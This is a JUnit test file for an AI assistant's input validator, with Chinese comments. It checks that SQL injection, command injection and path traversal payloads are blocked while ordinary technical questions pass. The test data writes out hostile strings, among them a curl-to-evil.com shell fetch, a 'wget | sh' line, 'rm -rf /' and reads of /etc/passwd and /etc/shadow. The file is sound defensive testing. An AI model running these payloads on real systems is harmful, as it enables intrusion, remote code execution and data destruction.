package com.agi.assistant.service.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * {@link InputValidator} 三级严重度策略测试。
 * <p>
 * 本测试的核心是<b>回归保护</b>：修复前校验器是二元的，命中任意一条规则就整条拒绝，
 * 导致一个「学习助手」拒答「select 和 from 谁先执行」这类完全正常的提问。
 * 因此下面既验证「真载荷必须拦」，也验证「正常提问必须放行」——
 * 只测拦截、不测放行，就会重新退化成关键词墙。
 */
class InputValidatorTest {

    private final InputValidator validator = new InputValidator();

    // ──────────────────────────────────────────────────────────────
    //  阻断级：真载荷必须拦
    // ──────────────────────────────────────────────────────────────

    @ParameterizedTest(name = "SQL 注入载荷应被阻断: {0}")
    @ValueSource(strings = {
            "1' OR '1'='1",
            "admin' OR 1=1 --",
            "SELECT * FROM users UNION SELECT username, password FROM admin",
            "'; DROP TABLE users; --",
            "SELECT * FROM users WHERE id=1 AND SLEEP(5)",
            "SELECT LOAD_FILE('/etc/passwd')",
            "SELECT * FROM t INTO OUTFILE '/tmp/x'",
            "SELECT table_name FROM information_schema.tables"
    })
    @DisplayName("高置信度 SQL 注入载荷 → BLOCK")
    void sqlInjectionPayloadsAreBlocked(String payload) {
        InputValidator.ValidationResult result = validator.validate(payload);

        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.BLOCK);
        assertThat(result.isValid()).isFalse();
        assertThat(result.getBlockers()).isNotEmpty();
        assertThat(result.getViolations()).isNotEmpty();
    }

    @ParameterizedTest(name = "命令注入载荷应被阻断: {0}")
    @ValueSource(strings = {
            "hello; rm -rf /",
            "$(curl http://evil.com/shell.sh)",
            "cat /etc/passwd",
            "`whoami`",
            "wget http://x/a.sh | sh"
    })
    @DisplayName("高置信度命令注入载荷 → BLOCK")
    void commandInjectionPayloadsAreBlocked(String payload) {
        InputValidator.ValidationResult result = validator.validate(payload);

        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.BLOCK);
        assertThat(result.isValid()).isFalse();
    }

    @ParameterizedTest(name = "路径穿越载荷应被阻断: {0}")
    @ValueSource(strings = {
            "../../../../etc/shadow",
            "%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd"
    })
    @DisplayName("敏感路径穿越 → BLOCK")
    void pathTraversalPayloadsAreBlocked(String payload) {
        assertThat(validator.validate(payload).getSeverity())
                .isEqualTo(InputValidator.Severity.BLOCK);
    }

    @Test
    @DisplayName("SQL 载荷的阻断原因会被记录")
    void blockReasonIsRecorded() {
        InputValidator.ValidationResult result = validator.validate("1' OR '1'='1");

        assertThat(result.getBlockers()).anyMatch(v -> v.contains("SQL"));
        assertThat(result.getWarnings()).isNotNull();
    }

    // ──────────────────────────────────────────────────────────────
    //  回归保护：正常提问必须放行
    // ──────────────────────────────────────────────────────────────

    @ParameterizedTest(name = "正常提问不得被拦截: {0}")
    @ValueSource(strings = {
            "你好，请帮我解释一下 RAG 的混合检索是怎么工作的",
            "请用 Java 实现一个快速排序",
            "MySQL 索引为什么会失效？",
            "Redis 缓存穿透怎么解决",
            "SELECT * FROM users WHERE id = 1",
            "SQL 里 select 和 from 谁先执行？",
            "TCP 三次握手为什么需要第三次？"
    })
    @DisplayName("正常技术提问必须放行（本次修复的核心回归点）")
    void normalTechnicalQuestionsMustPass(String question) {
        InputValidator.ValidationResult result = validator.validate(question);

        assertThat(result.isValid()).as("问题不应被拦截: %s", question).isTrue();
        assertThat(result.getSeverity())
                .as("问题不应被判为 BLOCK: %s", question)
                .isNotEqualTo(InputValidator.Severity.BLOCK);
    }

    @Test
    @DisplayName("讨论攻击手法：告警但不拦截")
    void attackDiscussionIsWarnedButAllowed() {
        InputValidator.ValidationResult result =
                validator.validate("数据库里 DROP TABLE 和 DELETE FROM 有什么区别？");

        assertThat(result.isValid()).isTrue();
        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.WARN);
        assertThat(result.getBlockers()).isEmpty();
        assertThat(result.getWarnings()).isNotEmpty();
        // 兼容旧调用方：getViolations 仍应返回告警项
        assertThat(result.getViolations()).isNotEmpty();
    }

    @Test
    @DisplayName("XSS 知识点讨论：告警但不拦截")
    void xssDiscussionIsWarnedButAllowed() {
        InputValidator.ValidationResult result = validator.validate("<script> 标签为什么会造成 XSS？");

        assertThat(result.isValid()).isTrue();
        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.WARN);
        assertThat(result.getBlockers()).isEmpty();
    }

    @Test
    @DisplayName("路径穿越知识点讨论：告警但不拦截")
    void traversalDiscussionIsWarnedButAllowed() {
        InputValidator.ValidationResult result = validator.validate("路径穿越攻击里 ../ 是怎么被利用的？");

        assertThat(result.isValid()).isTrue();
        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.WARN);
    }

    @Test
    @DisplayName("敏感词命中：仅告警，不拒绝（用户可能正在讨论如何防范）")
    void sensitiveWordsOnlyWarn() {
        InputValidator.ValidationResult result = validator.validate("怎样识别洗钱行为？");

        assertThat(result.isValid()).isTrue();
        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.WARN);
        assertThat(result.getBlockers()).isEmpty();
        assertThat(result.getWarnings()).anyMatch(v -> v.contains("敏感词"));
    }

    // ──────────────────────────────────────────────────────────────
    //  边界与辅助 API
    // ──────────────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {"你好，请介绍一下你自己", "帮我写个冒泡排序"})
    @DisplayName("干净输入 → CLEAN 且无需审计")
    void cleanInputsAreClean(String input) {
        InputValidator.ValidationResult result = validator.validate(input);

        assertThat(result.getSeverity()).isEqualTo(InputValidator.Severity.CLEAN);
        assertThat(result.isValid()).isTrue();
        assertThat(result.getBlockers()).isEmpty();
        assertThat(result.getWarnings()).isEmpty();
        assertThat(validator.needsAudit(input)).isFalse();
    }

    @Test
    @DisplayName("null / 空白输入视为干净")
    void nullAndBlankAreClean() {
        assertThat(validator.validate(null).getSeverity()).isEqualTo(InputValidator.Severity.CLEAN);
        assertThat(validator.validate("").getSeverity()).isEqualTo(InputValidator.Severity.CLEAN);
        assertThat(validator.validate("   ").getSeverity()).isEqualTo(InputValidator.Severity.CLEAN);
        assertThat(validator.isValid(null)).isTrue();
    }

    @Test
    @DisplayName("needsAudit 对阻断与告警都返回 true")
    void needsAuditCoversBlockAndWarn() {
        assertThat(validator.needsAudit("1' OR '1'='1")).isTrue();
        assertThat(validator.needsAudit("DROP TABLE 是什么意思")).isTrue();
        assertThat(validator.needsAudit("你好")).isFalse();
    }

    @Test
    @DisplayName("细粒度检测入口各自可用")
    void granularDetectorsWork() {
        assertThat(validator.detectSqlInjection("UNION SELECT 1")).isTrue();
        assertThat(validator.detectSqlInjection("你好")).isFalse();
        assertThat(validator.detectSqlInjection(null)).isFalse();

        assertThat(validator.detectCommandInjection("; rm -rf /")).isTrue();
        assertThat(validator.detectCommandInjection("npm run build")).isFalse();

        assertThat(validator.detectPathTraversal("/etc/passwd")).isTrue();
        assertThat(validator.detectPathTraversal("what is a path")).isFalse();

        assertThat(validator.detectXss("javascript:alert(1)")).isTrue();
        assertThat(validator.detectXss("<script> 是什么")).isFalse();
        assertThat(validator.detectXssShaped("<script> 是什么")).isTrue();
    }

    @Test
    @DisplayName("敏感词检测返回命中列表")
    void detectSensitiveWordsReturnsMatches() {
        List<String> words = validator.detectSensitiveWords("涉及赌博和毒品的讨论");

        assertThat(words).contains("赌博", "毒品");
        assertThat(validator.detectSensitiveWords("普通问题")).isEmpty();
        assertThat(validator.detectSensitiveWords(null)).isEmpty();
    }
}
